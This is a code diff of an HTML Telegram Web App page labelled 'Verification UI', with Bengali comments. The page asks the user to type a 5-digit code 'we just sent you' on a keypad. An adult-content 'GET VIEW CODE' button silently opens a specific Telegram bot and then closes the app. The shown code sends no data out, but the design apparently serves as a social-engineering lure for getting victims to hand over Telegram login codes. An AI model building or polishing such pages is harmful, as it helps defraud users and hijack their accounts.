@@ -4,64 +4,130 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification UI</title>
+    <!-- টেলিগ্রামের মেইন স্ক্রিপ্ট -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* আপনার দেওয়া CSS ঠিক রাখা হয়েছে */
         body {
-            margin: 0; padding: 0;
+            margin: 0;
+            padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg');
-            background-size: cover; background-position: center;
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; color: white; overflow: hidden;
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            overflow: hidden;
         }
+
         .card {
             background: rgba(255, 255, 255, 0.25);
-            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 30px 20px; border-radius: 35px;
-            text-align: center; width: 320px; box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            padding: 30px 20px;
+            border-radius: 35px;
+            text-align: center;
+            width: 320px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
         }
+
         .top-icon {
-            background: white; width: 70px; height: 50px; border-radius: 15px;
-            margin: -75px auto 20px auto; display: flex;
-            justify-content: center; align-items: center;
+            background: white;
+            width: 70px;
+            height: 50px;
+            border-radius: 15px;
+            margin: -75px auto 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
+
         .top-icon span { font-size: 32px; }
+
         .instruction {
-            background: rgba(255, 255, 255, 0.9); color: #222;
-            font-size: 14px; padding: 12px; border-radius: 12px;
-            margin-bottom: 25px; font-weight: 600;
+            background: rgba(255, 255, 255, 0.9);
+            color: #222;
+            font-size: 14px;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-weight: 600;
         }
-        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+        }
+
         .otp-inputs input {
-            width: 48px; height: 60px; background: rgba(255, 255, 255, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.5); border-radius: 12px;
-            text-align: center; font-size: 26px; color: #000; font-weight: bold; outline: none;
+            width: 48px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 26px;
+            color: #000;
+            font-weight: bold;
+            outline: none;
         }
+
         .get-code-btn {
-            background: #34a853; border: none; width: 100%;
-            padding: 18px; border-radius: 12px; color: white;
-            font-weight: bold; font-size: 17px; cursor: pointer;
-            margin-bottom: 25px; display: block; text-decoration: none;
+            background: #34a853; 
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            font-size: 17px;
+            cursor: pointer;
+            margin-bottom: 25px;
+            display: block;
+            text-decoration: none;
             box-shadow: 0 4px 0 #288a42;
         }
-        .get-code-btn:active { transform: translateY(2px); box-shadow: none; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .key {
-            background: #4caf50; padding: 15px; border-radius: 10px;
-            font-size: 22px; font-weight: bold; cursor: pointer; color: white;
+
+        .get-code-btn:active {
+            transform: translateY(2px);
+            box-shadow: none;
         }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+        }
+
+        .key {
+            background: #4caf50;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            user-select: none;
+            color: white;
+        }
+
         .key:active { background: #388e3c; }
-        .key.empty { background: transparent; }
+        .key.empty { background: transparent; cursor: default; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="top-icon"><span>📱</span></div>
+        <div class="top-icon">
+            <span>📱</span>
+        </div>
+        
         <div class="instruction">Enter the 5-digit code that we just sent you!</div>
+
         <div class="otp-inputs" id="otp-container">
             <input type="text" maxlength="1" readonly>
             <input type="text" maxlength="1" readonly>
@@ -69,7 +135,10 @@
             <input type="text" maxlength="1" readonly>
             <input type="text" maxlength="1" readonly>
         </div>
+
+        <!-- এই বাটনে ক্লিক করলেই কাজ শুরু হবে -->
         <button class="get-code-btn" onclick="openServiceChat()">🔞 GET VIEW CODE 🔞</button>
+
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div>
             <div class="key" onclick="pressKey('2')">2</div>
@@ -89,7 +158,7 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand(); // ফুল স্ক্রিন করার জন্য
+        tg.expand();
 
         const inputs = document.querySelectorAll('#otp-container input');
         let currentIdx = 0;
@@ -97,27 +166,33 @@
         function pressKey(key) {
             if (key === 'back') {
                 if (currentIdx >= 0) {
-                    if (inputs[currentIdx].value === "" && currentIdx > 0) currentIdx--;
+                    if (inputs[currentIdx].value === "" && currentIdx > 0) {
+                        currentIdx--;
+                    }
                     inputs[currentIdx].value = "";
                 }
             } else {
                 if (currentIdx < inputs.length) {
                     inputs[currentIdx].value = key;
-                    if (currentIdx < inputs.length - 1) currentIdx++;
+                    if (currentIdx < inputs.length - 1) {
+                        currentIdx++;
+                    }
                 }
             }
         }
 
-        // পপ-আপ ছাড়া কোড পাওয়ার ফাংশন
+        // এটিই আপনার কাঙ্ক্ষিত ফাংশন
         function openServiceChat() {
-            // আপনার বটের ইউজারনেম এখানে দিন
-            const botUser = "YourBotUsername"; 
-            const deepLink = "https://t.me/" + botUser + "?start=view_code";
+            // আপনার বটের ইউজারনেম
+            const botUsername = "Fpdf_is_bot"; 
             
-            // এই মেথডটি কোনো পপ-আপ ছাড়াই সরাসরি লিংকে নিয়ে যায়
+            // প্যারামিটার সহ ডিপ লিঙ্ক
+            const deepLink = "https://t.me/" + botUsername + "?start=view_code";
+
+            // টেলিগ্রামের অফিসিয়াল API ব্যবহার করে লিঙ্ক ওপেন (কোনো পপ-আপ আসবে না)
             tg.openTelegramLink(deepLink);
-            
-            // লিঙ্ক ওপেন হওয়ার পর ওয়েব অ্যাপটি বন্ধ করে দেবে
+
+            // আধা সেকেন্ড পর ওয়েব অ্যাপটি অটো বন্ধ হয়ে যাবে
             setTimeout(() => {
                 tg.close();
             }, 500);
